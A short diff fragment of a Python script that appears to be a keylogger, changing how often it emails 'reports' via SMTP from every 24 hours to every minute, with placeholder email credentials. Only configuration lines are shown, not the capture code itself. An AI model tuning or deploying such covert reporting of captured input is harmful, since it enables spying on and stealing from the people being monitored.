@@ -6,7 +6,7 @@ import smtplib  # For sending email using SMTP protocol (gmail).
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 86400  # (86400s = 24h) / time between reports, change according to your preference
+SEND_REPORT_EVERY = 60 # (60 = 1min) / time between reports, change according to your preference
 EMAIL_ADDRESS = 'exemple@notsafe.com'
 EMAIL_PASSWORD = 'notsosafe'
 
